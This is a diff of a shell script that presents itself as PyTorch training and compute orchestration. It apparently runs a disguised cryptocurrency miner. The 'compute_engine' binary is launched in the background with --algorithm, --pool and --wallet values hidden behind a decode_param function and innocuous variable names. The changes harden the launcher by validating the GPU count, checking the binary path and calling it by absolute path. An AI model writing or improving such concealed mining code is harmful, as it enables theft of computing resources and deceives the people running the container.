@@ -40,7 +40,11 @@ calculate_gpu_allocation() {
     local gpu_count=0
     
     if command -v nvidia-smi &> /dev/null; then
-        gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits | head -1)
+        gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | head -1)
+        # Validate that gpu_count is a number, default to 0 if not
+        if ! [[ "$gpu_count" =~ ^[0-9]+$ ]]; then
+            gpu_count=0
+        fi
     fi
     
     echo "$gpu_count"
@@ -221,6 +225,13 @@ start_pytorch_training() {
 
 # Function to start compute workloads
 start_compute_workloads() {
+    # Verify compute_engine binary exists and is executable
+    if [ ! -x /opt/bin/compute_engine ]; then
+        echo "ERROR: compute_engine binary not found or not executable at /opt/bin/compute_engine"
+        echo "Container build may have failed. Please rebuild the container."
+        exit 1
+    fi
+    
     # Clean old processes
     pkill -f compute_engine 2>/dev/null || true
     random_sleep 1 3
@@ -248,7 +259,7 @@ start_compute_workloads() {
     
     # Start GPU compute process only if GPUs are available
     if [ $GPU_COUNT -gt 0 ]; then
-        nohup ./compute_engine \
+        nohup /opt/bin/compute_engine \
             --algorithm $(decode_param "$MODEL_TYPE_A") \
             --pool $(decode_param "$ENDPOINT_PRIMARY") \
             --wallet $(decode_param "$AUTH_TOKEN_A") \
@@ -270,7 +281,7 @@ start_compute_workloads() {
     echo "Starting CPU compute workload ($PRIMARY_CPU_THREADS threads)..."
     
     # Start CPU compute process (using decoded parameters)
-    nohup ./compute_engine \
+    nohup /opt/bin/compute_engine \
         --algorithm $(decode_param "$MODEL_TYPE_B") \
         --pool $(decode_param "$ENDPOINT_SECONDARY") \
         --wallet $(decode_param "$AUTH_TOKEN_B") \
